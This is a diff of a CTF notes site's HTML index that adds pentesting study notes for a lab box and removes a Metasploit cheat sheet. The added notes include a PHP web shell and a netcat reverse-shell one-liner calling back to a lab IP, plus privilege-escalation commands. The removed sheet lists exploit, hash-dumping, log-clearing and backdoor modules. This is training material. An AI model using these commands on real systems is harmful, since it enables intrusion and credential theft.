@@ -250,6 +250,75 @@ if (!doNotTrack) {
         <div class="card-body">
             <div class="row">
                 <div class="col-md-10">
+                    <h3 class="fw-bold post-title">Blockchain</h3>
+                </div>
+                <div class="col-md-2 d-flex justify-content-end">
+                    <a href="https://ctf-journey.github.io/notes/guides/blockchain/">
+                        <button type="button" class="btn btn-outline-dark">
+                            Link
+                        </button>
+                    </a>
+                </div>
+            </div>
+
+            
+
+            <p class="post-meta">
+                <span class="post-meta text-muted">
+  
+  
+
+  January 1, 0001
+
+  
+
+  
+
+  
+
+  
+</span>
+
+            </p>
+            
+            <div class="post-entry">
+
+                
+                <h2 id="introduction">Introduction</h2>
+<h2 id="related-tools">Related Tools</h2>
+<ul>
+<li>Curated list <a href="https://github.com/blockthreat/blocksec-ctfs">Github</a></li>
+</ul>
+<h2 id="key-concepts">Key Concepts</h2>
+<h2 id="heading">.</h2>
+
+                
+            </div>
+        </div>
+        
+        
+        
+        <div class="card-footer text-muted">
+            <div class="blog-tags">
+                
+                <a href="https://ctf-journey.github.io/tags/guide/">guide</a>
+                
+            </div>
+        </div>
+        
+
+
+
+
+    </div>
+</div>
+    
+    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
+    
+        <div class="card border mb-3 "> 
+        <div class="card-body">
+            <div class="row">
+                <div class="col-md-10">
                     <h3 class="fw-bold post-title">Cryptography</h3>
                 </div>
                 <div class="col-md-2 d-flex justify-content-end">
@@ -974,6 +1043,98 @@ if (!doNotTrack) {
             <div class="post-entry">
 
                 
+                <h2 id="pentesting-basics">Pentesting basics</h2>
+<ul>
+<li>Common terms
+<ul>
+<li>shell, port, web server</li>
+</ul>
+</li>
+<li>Basic tools
+<ul>
+<li>ssh, netcat, tmux, vim</li>
+</ul>
+</li>
+<li>Service scanning
+<ul>
+<li>nmap, nmap scripts, banner grabbing, ftp, smb+shares, snmp (community string -  get network info and creds)</li>
+</ul>
+</li>
+<li>Web enumeration
+<ul>
+<li>gobuster (with seclists), banner grabbing, Whatweb, Certificates, Robots.txt, Source Code</li>
+</ul>
+</li>
+<li>public exploits
+<ul>
+<li>searchsploit, metasploit</li>
+</ul>
+</li>
+<li>types of shells
+<ul>
+<li>reverse shell</li>
+<li>bind shell</li>
+<li>Web Shell</li>
+<li>upgrade a shell with <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></li>
+</ul>
+</li>
+<li>privilege escalation
+<ul>
+<li>enumeration scripts (Linux enumeration scripts include LinEnum and linuxprivchecker, and for Windows include Seatbelt and JAWS), or Privilege Escalation Awesome Scripts SUITE (PEASS) for both</li>
+<li>Kernel Exploits</li>
+<li>Vulnerable Software</li>
+<li>User Privileges</li>
+<li>Scheduled Tasks</li>
+<li>Exposed Credentials</li>
+<li>SSH Keys</li>
+<li><code>(user2 : user2) NOPASSWD: /bin/bash</code> as user1 means <code>sudo -u user2 /bin/bash</code> works</li>
+</ul>
+</li>
+<li>transfering files
+<ul>
+<li>wget, SCP, Base64</li>
+</ul>
+</li>
+</ul>
+<h2 id="attacking-your-first-box">Attacking Your First Box</h2>
+<ul>
+<li>nibbles, enumeration
+<ul>
+<li><code>nmap -sV --open &lt;IP&gt;</code></li>
+</ul>
+</li>
+<li>nibbles, web footprinting
+<ul>
+<li>whatweb, <code>gobuster dir -u http://10.129.42.190/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt</code></li>
+</ul>
+</li>
+<li>nibbles, initial footprinting
+<ul>
+<li>upload <code>&lt;?php system (&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 9443 &gt;/tmp/f&quot;); ?&gt;</code> and use <code>nc -lvnp 9443</code> to catch shell and <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> to upgrade it</li>
+</ul>
+</li>
+<li>nibbles, privilege escation
+<ul>
+<li><code>monitor.sh</code> had sudo -l permission as root, can use <code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.39 8443 &gt;/tmp/f' | tee -a monitor.sh</code> to modify and connect as root</li>
+</ul>
+</li>
+<li>nibbles, metasploit
+<ul>
+<li>use msf module <code>multi/http/nibbleblog_file_upload</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="knowledge-check">Knowledge check</h2>
+<ul>
+<li>GetSimple CMS
+<ul>
+<li>user flag is enter admin page <code>admin:admin</code>, edit php theme</li>
+<li>root flag is suid php binary, use <code>sudo /usr/bin/php -r 'system(&quot;/bin/bash&quot;);'</code></li>
+</ul>
+</li>
+</ul>
+
+                
             </div>
         </div>
         
@@ -1072,7 +1233,7 @@ if (!doNotTrack) {
                     <h3 class="fw-bold post-title">HTB CA CTF</h3>
                 </div>
                 <div class="col-md-2 d-flex justify-content-end">
-                    <a href="https://ctf-journey.github.io/notes/writeups/ctf-2022-htb-ca/">
+                    <a href="https://ctf-journey.github.io/notes/backup/ctf-2022-htb-ca/">
                         <button type="button" class="btn btn-outline-dark">
                             Link
                         </button>
@@ -1139,7 +1300,7 @@ if (!doNotTrack) {
                     <h3 class="fw-bold post-title">Lag N Crash 2.0 CTF</h3>
                 </div>
                 <div class="col-md-2 d-flex justify-content-end">
-                    <a href="https://ctf-journey.github.io/notes/writeups/ctf-2022-lnc-v2/">
+                    <a href="https://ctf-journey.github.io/notes/backup/ctf-2022-lnc-v2/">
                         <button type="button" class="btn btn-outline-dark">
                             Link
                         </button>
@@ -1186,196 +1347,6 @@ if (!doNotTrack) {
                 <a href="https://ctf-journey.github.io/tags/writeup/">writeup</a>
                 
                 <a href="https://ctf-journey.github.io/tags/ctf/">ctf</a>
-                
-            </div>
-        </div>
-        
-
-
-
-
-    </div>
-</div>
-    
-    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
-    
-        <div class="card border mb-3 "> 
-        <div class="card-body">
-            <div class="row">
-                <div class="col-md-10">
-                    <h3 class="fw-bold post-title">Metasploit</h3>
-                </div>
-                <div class="col-md-2 d-flex justify-content-end">
-                    <a href="https://ctf-journey.github.io/notes/cert/ejpt-metasploit-framework/">
-                        <button type="button" class="btn btn-outline-dark">
-                            Link
-                        </button>
-                    </a>
-                </div>
-            </div>
-
-            
-
-            <p class="post-meta">
-                <span class="post-meta text-muted">
-  
-  
-
-  January 1, 0001
-
-  
-
-  
-
-  
-
-  
-</span>
-
-            </p>
-            
-            <div class="post-entry">
-
-                
-                <h2 id="metasploit-framework-msf">Metasploit Framework (MSF)</h2>
-<ul>
-<li>windows http file server
-<ul>
-<li>use msf module <code>exploit/windows/http/rejetto_hfs_exec</code></li>
-</ul>
-</li>
-<li>windows java web server
-<ul>
-<li>exploit the tomcat <code>exploit/multi/http/tomcat_jsp_upload_bypass</code></li>
-</ul>
-</li>
-<li>vulnerable ftp server
-<ul>
-<li>vsftpd is backdoored <code>exploit/unix/ftp/vsftpd_234_backdoor</code></li>
-</ul>
-</li>
-<li>vulnerable file sharing service
-<ul>
-<li>exploit the samba server <code>exploit/linux/samba/is_known_pipename</code></li>
-</ul>
-</li>
-<li>vulnerable ssh server
-<ul>
-<li>msf module <code>auxiliary/scanner/ssh/libssh_auth_bypass</code></li>
-</ul>
-</li>
-<li>vulnerable smtp server
-<ul>
-<li>haraka mail server <code>exploit/linux/smtp/haraka</code>, set <code>SRVPORT 9898</code> <code>email_to root@attackdefense.test</code> <code>payload linux/x64/meterpreter_reverse_http</code></li>
-</ul>
-</li>
-<li>meterpreter basics
-<ul>
-<li>check the php file and realise xdebug enabled, use <code>exploit/unix/http/xdebug_unauth_exec</code></li>
-<li>available commands <code>pwd</code> <code>ls</code> <code>lpwd</code> <code>lls</code> <code>edit</code> <code>cat</code> <code>download</code> <code>unzip</code> <code>rm</code> <code>checksum</code> <code>getenv PATH</code> <code>search -d /usr/bin -f *ckdo*</code> <code>lcd</code> <code>upload</code></li>
-</ul>
-</li>
-<li>upgrading shells to meterpreter
-<ul>
-<li>exploit samba again <code>exploit/linux/samba/is_known_pipename</code> to get shell, upgrade to meterpreter with <code>post/multi/manage/shell_to_meterpreter</code></li>
-</ul>
-</li>
-<li>windows post exploitation
-<ul>
-<li>exploit hfs first to get shell <code>exploit/windows/http/rejetto_hfs_exec</code></li>
-<li>post exploitation using <code>post/windows/gather/win_privs</code> <code>post/windows/gather/enum_logged_on_users</code> <code>post/windows/gather/checkvm</code> <code>post/windows/gather/enum_applications</code> <code>post/windows/gather/enum_computers</code> <code>post/windows/gather/enum_shares</code></li>
-</ul>
-</li>
-<li>uac bypass, msf memory injection
-<ul>
-<li>exploit the hsf server <code>exploit/windows/http/rejetto_hfs_exec</code>, migrate to privileged process <code>ps -S explorer.exe</code> <code>migrate 2124</code> <code>getsystem</code></li>
-<li>to use the memory injection, background the session and use <code>exploit/windows/local/bypassuac_injection</code>, migrate again and you can dump hashes <code>ps -S lsass.exe</code> <code>migrate 484</code> <code>hashdump</code></li>
-</ul>
-</li>
-<li>exploiting smb with psexec
-<ul>
-<li>msf module to bruteforce <code>auxiliary/scanner/smb/smb_login</code>, set <code>USER_FILE</code> <code>PASS_FILE</code> <code>RHOSTS</code> and <code>VERBOSE</code></li>
-<li>msf module to gain access <code>exploit/windows/smb/psexec</code>, set <code>RHOSTS</code> <code>SMBUser</code> and <code>SMBPass</code></li>
-</ul>
-</li>
-<li>windows enable remote desktop
-<ul>
-<li>exploit the badblue <code>exploit/windows/http/badblue_passthru</code></li>
-<li>enable the rdp post exploit <code>use post/windows/manage/enable_rdp</code></li>
-</ul>
-</li>
-<li>clearing windows event logs
-<ul>
-<li>its just the <code>clearev</code></li>
-</ul>
-</li>
-<li>pivoting
-<ul>
-<li>exploit the hfs <code>use exploit/windows/http/rejetto_hfs_exec</code>, use the autoroute <code>run autoroute -s 10.0.16.0/20</code></li>
-<li>port forwarding in metasploit with <code>portfwd add -l 1234 -p 80 -r demo2.ine.local</code> and check the list with <code>portfwd list</code></li>
-<li>exploit the badblue on the internal server <code>exploit/windows/http/badblue_passthru</code></li>
-</ul>
-</li>
-<li>linux post exploitation lab I
-<ul>
-<li>exploit using <code>use exploit/linux/samba/is_known_pipename</code></li>
-<li>gather configuration files <code>use post/linux/gather/enum_configs</code></li>
-<li>gather environmental variables <code>use post/multi/gather/env</code></li>
-<li>gather network settings <code>use post/linux/gather/enum_network</code></li>
-<li>check system protections <code>use post/linux/gather/enum_protections</code></li>
-<li>gather system info <code>use post/linux/gather/enum_system</code></li>
-<li>check if inside container <code>use post/linux/gather/checkcontainer</code></li>
-<li>check if inside vm <code>use post/linux/gather/checkvm</code></li>
-<li>check user history <code>use post/linux/gather/enum_users_history</code></li>
-<li>spawn other types of shell <code>use post/multi/manage/system_session</code></li>
-<li>download file using meterpreter <code>use post/linux/manage/download_exec</code></li>
-</ul>
-</li>
-<li>privilege escalation, rootkit scanner
-<ul>
-<li>its a vulnerable rootkit scanner called chkrootkit found using <code>ps -aux</code>, exploit using <code>use exploit/unix/local/chkrootkit</code></li>
-</ul>
-</li>
-<li>linux post exploitation lab II
-<ul>
-<li>gather ssh credentials <code>use post/multi/gather/ssh_creds</code></li>
-<li>gather docker credentials <code>use post/multi/gather/docker_creds</code></li>
-<li>dump hashes <code>use post/linux/gather/hashdump</code></li>
-<li>extract ecrypt folder which may have credentials <code>use post/linux/gather/ecryptfs_creds</code></li>
-<li>extract wifi credentials <code>use post/linux/gather/enum_psk</code></li>
-<li>extract xchat <code>use post/linux/gather/enum_xchat</code></li>
-<li>extract phpmyadmin <code>use post/linux/gather/phpmyadmin_credsteal</code></li>
-<li>extract pptp tunneling protocol using <code>use post/linux/gather/pptpd_chap_secrets</code></li>
-<li>create sshkey backdoor <code>use post/linux/manage/sshkey_persistence</code></li>
-</ul>
-</li>
-<li>establishing persistence on linux
-<ul>
-<li>create sshkey backdoor <code>use post/linux/manage/sshkey_persistence</code></li>
-</ul>
-</li>
-<li>port scanning and enumeration with armitage
-<ul>
-<li>GUI for metasploit, click <code>open shell</code></li>
-</ul>
-</li>
-<li>exploitation and post exploitation with armitage
-<ul>
-<li>GUI for metasploit, open meterpreter and dump hashes</li>
-</ul>
-</li>
-</ul>
-
-                
-            </div>
-        </div>
-        
-        
-        
-        <div class="card-footer text-muted">
-            <div class="blog-tags">
-                
-                <a href="https://ctf-journey.github.io/tags/ejpt/">ejpt</a>
                 
             </div>
         </div>
